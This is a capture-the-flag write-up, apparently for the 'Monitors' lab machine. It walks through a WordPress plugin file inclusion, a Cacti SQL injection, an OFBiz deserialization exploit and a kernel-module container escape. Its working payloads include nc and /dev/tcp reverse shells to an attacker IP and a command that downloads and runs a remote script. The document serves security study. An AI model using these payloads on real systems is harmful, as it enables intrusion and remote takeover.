## Monitors

![[avatar.png|150]]

### Lab Details 

- Difficulty: Hard
- Type: Linux

#### Enumeration
- run `nmap`
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
```
- upon visiting the site we get error message `Sorry, direct IP access is not allowed..`
```bash
$ curl http://10.129.232.111/
Sorry, direct IP access is not allowed. <br><br>If you are having issues accessing the site then contact the website administrator: admin@monitors.htb
```
- try adding the host name to `/etc/hosts` and we get monitor home page
![[monitor.htb.png]]
- run `ffuf` for fuzzing
```bash
$ ffuf -u http://monitors.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitors.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

.                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 87ms]
wp-admin                [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 166ms]
wp-includes             [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 432ms]
wp-content              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 490ms]
```

![[wp login.png]]
```bash
wpscan --url http://monitors.htb --api-token <TOKEN>
<SNIP>
[+] wp-with-spritz
 | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-08-20T20:15:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP with Spritz 1.0 - Unauthenticated File Inclusion
 |     References:
 |      - https://wpscan.com/vulnerability/cdd8b32a-b424-4548-a801-bbacbaad23f8
 |      - https://www.exploit-db.com/exploits/44544/
 |
 | Version: 4.2.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt
```
- found [`POC exploit`](https://www.exploit-db.com/exploits/44544)
- tested and got `lfi` 
![[test lfi.png]]
#### Initial Foothold 
- using `php wrapper` we get the `wp-settings.php` file
```bash
php://filter/convert.base64-encode/resource=/var/www/wordpress/wp-config.php
```
- `base64` decode it, we can see the database login 
```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
```
![[cacti login.png]]
- perform a password reuse, we can login with `admin:c`
- attempted with running the exploit however did not receive a reverse shell
```bash
$ python3 exploit.py  -t http://cacti-admin.monitors.htb/ -u admin -p 'BestAdministrator@2020!' --lhost 10.10.14.82 --lport 9001
[+] Connecting to the server...
[+] Retrieving CSRF token...
[+] Got CSRF token: sid:ef9d32d147ac7c0579f21e18ce3942cf662cc246,1761635578
[+] Trying to log in...
[+] Successfully logged in!

[+] SQL Injection:
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
```
- inspect the code
```python
def exploit(lhost, lport, session):
    rshell = urllib.parse.quote(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f")
    payload = f"')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{rshell};'+where+name='path_php_binary';--+-"
## export 
    exploit_request = session.get(url + f"/cacti/color.php?action=export&header=false&filter=1{payload}") #, proxies=proxies)

    print("\n[+] SQL Injection:")
    print(exploit_request.text)

    try:
        session.get(url + "/cacti/host.php?action=reindex", timeout=1) #, proxies=proxies)
    except Exception:
        pass

    print("[+] Check your nc listener!")
```
- visit `/color.php`
![[color export exploit.png]]
- from the exploit code we see that its attempting to export color, click on export and capture with `burpsuite` 
![[burpsuite intercept color request.png]]
- send it to repeater, and we can attempt with injection in the filter parameter
```sql
')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='@@version;'+where+name='path_php_binary';--+-
```
- get the entire payload and test for output
```sql
/cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%2010.10.14.82%209001%20%3E/tmp/f;'+where+name='path_php_binary';--+-
```
- we see the output from `user_auth` table
![[sqli for cacti.png]]
#### Lateral Movement (If any)
- check for `cactil` config file and found some data base credentials
```bash
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'localhost';
$database_username = 'cacti';
$database_password = 'cactipass';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';

#$rdatabase_type     = 'mysql';
#$rdatabase_default  = 'cacti';
#$rdatabase_hostname = 'localhost';
#$rdatabase_username = 'cactiuser';
#$rdatabase_password = 'cactiuser';
#$rdatabase_port     = '3306';
#$rdatabase_retries  = 5;
#$rdatabase_ssl      = false;
#$rdatabase_ssl_key  = '';
#$rdatabase_ssl_cert = '';
#$rdatabase_ssl_ca   = '';
```
- tried to enumerate the `mysql` database, nothing useful was found
```bash
mysql -u cacti -cactipass -h localhost
```
- load and run `linpeas.sh`, we see that there is a backup file named `cacti-backup.service`
```bash
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 342 Oct 27 15:43 /run/blkid/blkid.tab.old
-rw-r--r-- 1 root root 2765 Aug  5  2019 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 8881 Apr 12  2021 /lib/modules/4.15.0-142-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9081 Apr 12  2021 /lib/modules/4.15.0-142-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 8881 Jul  9  2021 /lib/modules/4.15.0-151-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9081 Jul  9  2021 /lib/modules/4.15.0-151-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 178 Nov 10  2020 /lib/systemd/system/cacti-backup.service
```
- check the backup file content 
```bash
marcus@monitors:~$ cat /lib/systemd/system/cacti-backup.service
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target
```
- found a backup script in user `marcus`'s directory 
- check for file permission, `www-data` is the owner
```bash
www-data@monitors:/etc/systemd/system$ ls -la /home/marcus/.backup/backup.sh
-r-xr-x--- 1 www-data www-data 259 Nov 10  2020 /home/marcus/.backup/backup.sh
```
- check the file content and we get the password for user `marcus`
```bash
www-data@monitors:/etc/systemd/system$ cat /home/marcus/.backup/backup.sh
#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
```
#### Privilege Escalation
- read `note.txt`
```bash
marcus@monitors:~$ ls
note.txt  user.txt
marcus@monitors:~$ cat note.txt 
TODO:

Disable phpinfo	in php.ini		- DONE
Update docker image for production use	- 
```
- we see that docker is mentioned which means that this machine might be running docker 
- check for ports using `linpeas.sh`
```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -      
```
- we see that there is a internal facing port `8443`
- we can perform port forwarding with `ssh`
```bash
$ ssh -L 8443:127.0.0.1:8443 marcus@10.129.232.111
```
- visit the port on localhost and we get `404` note found error
![[404 for internal port.png]]
- fuzzing for files 
```bash
$ ffuf -u https://127.0.0.1:8443/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://127.0.0.1:8443/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 119ms]
catalog                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 108ms]
content                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 55ms]
common                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 61ms]
ar                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 38ms]
ebay                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 63ms]
marketing               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 334ms]
ecommerce               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
passport                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
ap                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
example                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
accounting              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
projectmgr              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
webtools                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 315ms]
bi                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 322ms]
```
- tried few different endpoints we get to login page of `OFBiz` site
![[ofbiz.png]]
- version is `17.1201`
- search online and found an exploit for this version of `OFBiz` 
- [`POC` here](https://www.exploit-db.com/exploits/50178)
- this `POC` wont work as the `github repo` thats hosting this file no longer exists 
- but we still can get it through way back machine
```bash
$ wget https://web.archive.org/web/20210308200156/https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.jar
```
- only we have the `ysoserial` jar file we can create the payload
- first we need to generate the reverse shell
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.83/4444 0>&1
```
- the actual command for the reverse shell is split in two parts
- first part is getting the reverse shell from attacker , we will host the reverse shell using `python -m http.server`
- serialize it and encode it in base64
```
 java \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
-jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "curl 10.10.14.82:8000/bash.sh -o /tmp/bash.sh" | base64 | tr -d "\n"
  rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbk<SNIP>
```
- second part of the reverse shell command is executing the shell and serialize it then encode it 
```bash
$ java \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
-jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "bash /tmp/bash.sh" | base64 | tr -d "\n"
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNv
```
- we need to send the request in two parts as well 
- below is the structure of the post request change the payload as needed
```bash
## below is command to send request through for https://www.exploit-db.com/exploits/50178
  curl -k -X POST https://127.0.0.1:8443/webtools/control/xmlrpc \
  -H "Content-Type: application/xml" \
  -H "Cookie: JSESSIONID=F44467882AEF38BB2674E02875ADAFCF.jvm1; OFBiz.Visitor=10022" \
  -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">rO0...（base64）...</serializable></value></member></struct></value></param></params></methodCall>'
```
- we get a shell on our `nc` listener
```bash
root@18399a870a2c:/usr/src/apache-ofbiz-17.12.01# whoami
whoami
root
```
- check if we are running in a docker container which we are 
```
root@18399a870a2c:/usr/src/apache-ofbiz-17.12.01# ls -la /
ls -la /
total 11840
drwxr-xr-x   1 root root     4096 Oct 27 15:43 .
drwxr-xr-x   1 root root     4096 Oct 27 15:43 ..
-rwxr-xr-x   1 root root        0 Oct 27 15:43 .dockerenv
```
- check current process capabilities 
```bash
root@18399a870a2c:/# capsh --print
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=

```
- we see that we have c privilege, which allows a process to load and unload kernel modules 
- check the kernel version
```bash
root@18399a870a2c:/# uname -r
uname -r
4.15.0-151-generic
```
- check the available kernel libraries, we can use the `4.15.0-151-generic` to compile a kernel module
```bash
root@18399a870a2c:/# ls -la /lib/modules
ls -la /lib/modules
total 20
drwxr-xr-x 1 root root 4096 Sep 27  2021 .
drwxr-xr-x 1 root root 4096 Apr  9  2021 ..
drwxr-xr-x 2 root root 4096 Apr  9  2021 4.15.0-132-generic
drwxr-xr-x 2 root root 4096 Apr 22  2021 4.15.0-142-generic
drwxr-xr-x 2 root root 4096 Sep 27  2021 4.15.0-151-generic
```
- create a malicious kernel module
```bash
root@18399a870a2c:~# cat shell.c
cat shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.82/9000 0>&1", NULL};
static char* envp[] =
{"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
 return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
 printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
- create a `makefile` for the kernel module
```bash
root@18399a870a2c:~# cat Makefile
cat Makefile
obj-m += shell.o
all:
	make -C /lib/modules/4.15.0-151-generic/build M=$(shell pwd) modules
clean:
	make -C /lib/modules/4.15.0-151-generic/build M=$(shell pwd) clean
```
- make the module with `make`
```bash
root@18399a870a2c:~# make
make
make -C /lib/modules/4.15.0-151-generic/build M=/root modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-151-generic'
  CC [M]  /root/shell.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /root/shell.mod.o
  LD [M]  /root/shell.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-151-generic'
```
- `shell.ko` is generated, so we can load the module with `insmod`
```bash
root@18399a870a2c:~# insmod shell.ko        
insmod shell.ko
```
- we get reverse shell as root
```bash
$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.232.111] 60758
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@monitors:/# whoami
whoami
root
```
#### Resources

#### Lesson Learned
